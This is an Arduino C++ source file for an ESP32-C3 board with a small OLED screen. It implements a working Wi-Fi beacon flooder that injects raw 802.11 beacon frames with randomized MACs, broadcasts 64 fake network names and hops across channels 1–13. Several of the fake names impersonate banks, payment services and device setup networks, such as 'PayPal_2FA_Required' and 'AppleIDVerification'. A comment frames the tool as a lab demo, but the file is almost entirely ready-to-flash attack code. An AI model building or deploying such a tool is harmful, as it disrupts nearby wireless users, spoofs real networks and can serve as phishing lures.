#include <Arduino.h>
#include <WiFi.h>
#include "esp_wifi.h"
#include <Wire.h>
#include <U8g2lib.h>

// ── Board pins ────────────────────────────────────────────────────────────────
#define OLED_SCL  6
#define OLED_SDA  5
#define BOOT_BTN  9   // active LOW, internal pullup

// ── Display ───────────────────────────────────────────────────────────────────
U8G2_SSD1306_72X40_ER_F_HW_I2C u8g2(U8G2_R0, U8X8_PIN_NONE, OLED_SCL, OLED_SDA);

// ── Config ────────────────────────────────────────────────────────────────────
#define SSID_COUNT   64   // fake networks to flood
#define CHAN_MIN      1
#define CHAN_MAX     13
#define CHAN_HOP_MS 200   // ms per channel before hopping

// ── Beacon frame template (filled per SSID at runtime) ────────────────────────
// Fixed-length beacon with max 32-char SSID slot
// [0-1]   FC 0x80 0x00
// [2-3]   Duration
// [4-9]   Dest: broadcast
// [10-15] Src MAC (random per beacon)
// [16-21] BSSID (same as src)
// [22-23] Seq ctrl
// [24-31] Timestamp (zeroed)
// [32-33] Beacon interval 100 TU
// [34-35] Capability: ESS
// [36]    Tag: SSID (0x00)
// [37]    SSID length
// [38..69] SSID (up to 32 bytes)
// [70]    Tag: Supported Rates (0x01)
// [71]    Length: 8
// [72-79] Rates
// [80]    Tag: DS Param (0x03)
// [81]    Length: 1
// [82]    Channel
#define FRAME_BASE  83
static uint8_t beacon_frame[FRAME_BASE] = {
  // Frame Control
  0x80, 0x00,
  // Duration
  0x00, 0x00,
  // Dest: broadcast
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  // Src MAC — randomized per packet
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  // BSSID — same as src
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  // Seq ctrl
  0x00, 0x00,
  // Timestamp (8 bytes)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  // Beacon interval: 100 TU = 0x0064
  0x64, 0x00,
  // Capability: ESS
  0x01, 0x00,
  // SSID tag
  0x00,
  // SSID length (filled at runtime)
  0x00,
  // SSID (32 bytes zeroed, filled at runtime)
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  // Supported Rates: 1,2,5.5,11,6,9,12,18 Mbps
  0x01, 0x08, 0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24,
  // DS Parameter Set
  0x03, 0x01, 0x01
};

// ── SSID bank ─────────────────────────────────────────────────────────────────
// Mix of random-looking and funny names for lab demo impact
static const char* ssid_bank[] = {
  "FBI Surveillance Van",  "NSA Mobile Unit",        "CIA Field Office",
  "DEA Narcotics Task",    "ATF Weapons Team",        "Homeland Security",
  "Secret Service Ops",    "Free Public WiFi",        "xfinitywifi-setup",
  "AndroidShare_0000",     "iPhone of Unknown",       "Pretty Fly 4 WiFi",
  "Bill Wi the Science Fi","Silence of the LANs",     "The LAN Before Time",
  "Wu-Tang LAN",           "It Hurts When IP",        "404 Network NotFound",
  "The Promised LAN",      "Abraham Linksys",         "John Wilkes Bluetooth",
  "Nacho WiFi",            "GetOffMyLAN",             "NotYourWiFi",
  "VirusInstaller.exe",    "HackersDelight",          "TotallyLegitNetwork",
  "DefinitelyNotTheNSA",   "FreeUpgrade_Install",     "ClickHereForInternet",
  "WinXP_SP3_Required",    "UpdateYourDrivers",       "MicrosoftSupport_v2",
  "AppleIDVerification",   "GooglePaymentPortal",      "NetflixDeviceReg",
  "AmazonPrime_Secure",    "PayPal_2FA_Required",     "BankOfAmerica_WiFi",
  "Chase_Secure_Network",  "Coinbase_Verify",         "BTC_Wallet_Sync",
  "OpenAI_Research_Net",   "Tesla_ServiceMode",       "SpaceX_Starlink_GW",
  "DOGE_Mining_Pool",      "FortnitePatch_v25",       "Discord_CDN_Node",
  "Roblox_Asset_Server",   "SteamLink_Broadcast",     "XboxLive_Relay",
  "PS5_Remote_Play",       "Ring_Camera_Setup",       "NestHub_Provisioning",
  "EchoDevice_Setup",      "ChromecastUltra_0x44",    "RokuTV_Direct",
  "SmartFridge_GE_002F",   "ThermostatSetup_Honeywell","Doorbell_Setup_7B3A",
  "PrinterShare_HP_0F2C",  "HP_LaserJet_P2035",       "EPSON_WF3820_Direct",
  "TP-Link_Extender_5G",
};
static_assert(sizeof(ssid_bank)/sizeof(ssid_bank[0]) >= SSID_COUNT,
              "ssid_bank too small for SSID_COUNT");

// ── State ─────────────────────────────────────────────────────────────────────
static bool     running    = true;
static uint32_t pkt_count  = 0;
static uint8_t  cur_chan   = CHAN_MIN;
static uint32_t chan_timer = 0;

// ── OLED ──────────────────────────────────────────────────────────────────────
static void oled_update() {
  char l1[20], l2[20], l3[20];
  snprintf(l1, sizeof(l1), running ? "FLOODING" : "PAUSED");
  snprintf(l2, sizeof(l2), "ch%d  nets:%d", cur_chan, SSID_COUNT);
  snprintf(l3, sizeof(l3), "pkts:%lu", pkt_count);

  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_4x6_tr);
  u8g2.drawStr(0, 6,  l1);
  u8g2.drawStr(0, 14, l2);
  u8g2.drawStr(0, 22, l3);
  u8g2.sendBuffer();
}

// ── Button (debounced short press) ───────────────────────────────────────────
static bool button_pressed() {
  if (digitalRead(BOOT_BTN) != LOW) return false;
  delay(30);
  if (digitalRead(BOOT_BTN) != LOW) return false;
  while (digitalRead(BOOT_BTN) == LOW) delay(10);
  return true;
}

// ── Random MAC helper ─────────────────────────────────────────────────────────
static void random_mac(uint8_t* mac) {
  for (int i = 0; i < 6; i++) mac[i] = (uint8_t)esp_random();
  mac[0] &= 0xFE; // unicast
  mac[0] |= 0x02; // locally administered
}

// ── Send one beacon for a given SSID index on current channel ────────────────
static void send_beacon(uint8_t ssid_idx) {
  const char* ssid = ssid_bank[ssid_idx % SSID_COUNT];
  uint8_t     slen = strlen(ssid);
  if (slen > 32) slen = 32;

  // Random MAC for src and BSSID
  uint8_t mac[6];
  random_mac(mac);
  memcpy(&beacon_frame[10], mac, 6);
  memcpy(&beacon_frame[16], mac, 6);

  // SSID field
  beacon_frame[37] = slen;
  memset(&beacon_frame[38], 0, 32);
  memcpy(&beacon_frame[38], ssid, slen);

  // Channel in DS param
  beacon_frame[82] = cur_chan;

  esp_wifi_80211_tx(WIFI_IF_AP, beacon_frame, FRAME_BASE, false);
  pkt_count++;
}

// ── Setup ─────────────────────────────────────────────────────────────────────
void setup() {
  Serial.begin(115200);
  pinMode(BOOT_BTN, INPUT_PULLUP);

  Wire.begin(OLED_SDA, OLED_SCL);
  u8g2.begin();

  // AP mode gives us access to WIFI_IF_AP for raw TX
  WiFi.mode(WIFI_AP);
  WiFi.softAP("esp32c3", nullptr, cur_chan);

  chan_timer = millis();
  oled_update();
  Serial.println("[*] Beacon flooding started");
}

// ── Loop ──────────────────────────────────────────────────────────────────────
void loop() {
  if (button_pressed()) {
    running = !running;
    Serial.printf("[*] %s\n", running ? "Resumed" : "Paused");
    oled_update();
  }

  if (!running) { delay(50); return; }

  // Send one beacon for each SSID in the bank
  for (uint8_t i = 0; i < SSID_COUNT; i++) {
    send_beacon(i);
  }

  // Hop channel every CHAN_HOP_MS
  if (millis() - chan_timer >= CHAN_HOP_MS) {
    cur_chan = (cur_chan >= CHAN_MAX) ? CHAN_MIN : cur_chan + 1;
    esp_wifi_set_channel(cur_chan, WIFI_SECOND_CHAN_NONE);
    chan_timer = millis();
    Serial.printf("[+] ch%d  pkts=%lu\n", cur_chan, pkt_count);
  }

  // Refresh display every 500 packets
  if (pkt_count % 500 == 0) oled_update();
}
